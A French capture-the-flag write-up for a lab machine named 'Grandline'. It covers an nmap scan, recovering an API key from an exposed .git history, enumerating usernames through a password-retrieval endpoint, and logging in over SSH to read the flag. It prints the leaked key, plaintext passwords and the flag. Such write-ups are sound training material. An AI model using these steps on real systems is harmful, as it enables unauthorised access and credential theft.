# Grandline
 
Lancement du VPN avec ```sudo openvpn EPI_Nathan_Lescaut.ovpn```
 
Lancement d'un second terminal pour travailler et lancement de nmap avec ```nmap -sV -sC 10.10.0.7```
 
Avec ce scan, on va pouvoir voir tous les ports ouverts :
```
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
8081/tcp open  blackice-icecap?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.8 Python/3.13.5
|     Date: Sun, 27 Sep 2026 10:10:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
```
 
On peut donc voir un port ouvert, le 8081/tcp, donc on va voir ce que c'est avec ```http://10.10.0.7:8081/```
 
Comme on veut le mot de passe, on va voir la page de login puis "mot de passe oublié". Puis on consulte la page et on regarde son script, on regarde un peu partout, et on voit :
```
function api(){
    var xhttp = new XMLHttpRequest();
    var data=document.getElementById("username").value;
    console.log(data);
    xhttp.open("POST", "/api/retrieve-d-password/"+data, true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the retrieve password functionality
}
```
 
Après avoir récupéré cela, on va tester la clé API :
```
curl -i -X POST "http://10.10.0.7:8081/api/retrieve-d-password/admin" \
  -H "Content-type: application/json" \
  -d '{"key":"NULL"}'
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.5
Date: Sun, 27 Sep 2026 10:25:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 15
Connection: close
Invalid API Key%
```
 
Cela nous dit que la clé API n'est pas la bonne, donc on va regarder du côté du code et voir s'il n'y a pas un dépôt Git, et si oui, on récupère le tout :
```
curl -i http://10.10.0.7:8081/.git/HEAD
```
 
Oui, il y en a un, donc on va l'installer et le mettre dans un dossier, puis y entrer pour voir tous les commits :
```
pip install git-dumper --break-system-packages 
mkdir -p ~/loot
cd ~/loot/grandline-git
git log --all --oneline
git show 0e68fc9
```
 
```
commit 0e68fc9c18190dbbef86a5a3bad44d97f1badc47
Author: Gabriel Madelaine-Toublanc <gabrie1.madelaine-toublanc@epitech.eu>
Date:   Thu Jul 9 16:39:31 2026 +0200
 
    Redact api key
 
diff --git a/app.py b/app.py
index 43545f1..d27a215 100644
--- a/app.py
+++ b/app.py
@@ -22,7 +22,7 @@ def info(uname):
     print("OK")
     data=request.get_json(force=True)
     print(data)
-    if(data['key']=='57db5c001c802fc4be25afb02cff9bf8'):
+    if(data['key']=='<YOUR API_KEY>'):
         if(uname=="admin"):
             return '{"username":"admin","password":"YOURADMINPASSWORD"}'
         else:
(END)
```
 
Avec tout cela, on voit qu'il y a un commit qui s'appelle ```0e68fc9 Redact api key```.
 
On va tester l'API comme elle nous posait problème :
```
curl -i -X POST "http://10.10.0.7:8081/api/retrieve-d-password/admin" \
  -H "Content-type: application/json" \
  -d '{"key":"57db5c001c802fc4be25afb02cff9bf8"}'
```
Et là on voit qu'il y a un problème avec le username :
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.5
Date: Sun, 27 Sep 2026 10:34:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 16
Connection: close
 
Invalid Username%
```
 
Par la suite, on fait un script et on regarde ce qu'il nous renvoie :
```
for name in luffy zoro nami sanji chopper robin franky brook usopp jinbe shanks ace sabo garp buggy mihawk law kid boa hancock crocodile doflamingo katakuri whitebeard kaido bigmom blackbeard smoker tashigi vivi carrot yamato; do
  resp=$(curl -s -X POST "http://10.10.0.7:8081/api/retrieve-d-password/$name" \
    -H "Content-type: application/json" \
    -d '{"key":"57db5c001c802fc4be25afb02cff9bf8"}' --max-time 5)
  echo "$name => $resp"
  sleep 0.3
done
 
luffy => {"username":"luffy","password":"ThisIsN0tMyPassword"}
zoro => {"username":"zoro","password":"I_G07_L0S7_0Nc3_4G41n"}
nami => Invalid Username
sanji => Invalid Username
chopper => Invalid Username
robin => Invalid Username
franky => Invalid Username
brook => Invalid Username
usopp => Invalid Username
jinbe => Invalid Username
shanks => Invalid Username
ace => Invalid Username
sabo => Invalid Username
garp => Invalid Username
buggy => Invalid Username
mihawk => Invalid Username
law => Invalid Username
kid => Invalid Username
boa => Invalid Username
hancock => Invalid Username
crocodile => Invalid Username
doflamingo => Invalid Username
katakuri => Invalid Username
whitebeard => Invalid Username
kaido => Invalid Username
bigmom => Invalid Username
blackbeard => Invalid Username
smoker => Invalid Username
tashigi => Invalid Username
vivi => Invalid Username
carrot => Invalid Username
yamato => Invalid Username
```
 
On voit qu'on a une réponse pour luffy et zoro, donc on les teste en tant qu'utilisateurs :
 
```
ssh luffy@10.10.0.7
luffy@10.10.0.7's password: 
Permission denied, please try again.
luffy@10.10.0.7's password: 
Permission denied, please try again.
luffy@10.10.0.7's password: 
luffy@10.10.0.7: Permission denied (publickey,password).
➜  grandline-git git:(master) ssh zoro@10.10.0.7
zoro@10.10.0.7's password: 
Permission denied, please try again.
zoro@10.10.0.7's password: 
Linux grandline 6.8.0-136-generic #136-Ubuntu SMP PREEMPT_DYNAMIC Wed Jul  1 21:53:05 UTC 2026 x86_64
 
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 27 10:38:19 2026 from 10.8.1.5
zoro@grandline:~$ 
```
 
On peut voir qu'avec luffy je n'arrive pas à me connecter, mais avec zoro oui. Je me connecte donc grâce à ```ssh zoro@10.10.0.7``` et je récupère le flag :
```
cat ~/user.txt
EPI{1f_1_91V3_uP_noW_1m_9o1N9_7O_r39R37_17}
```
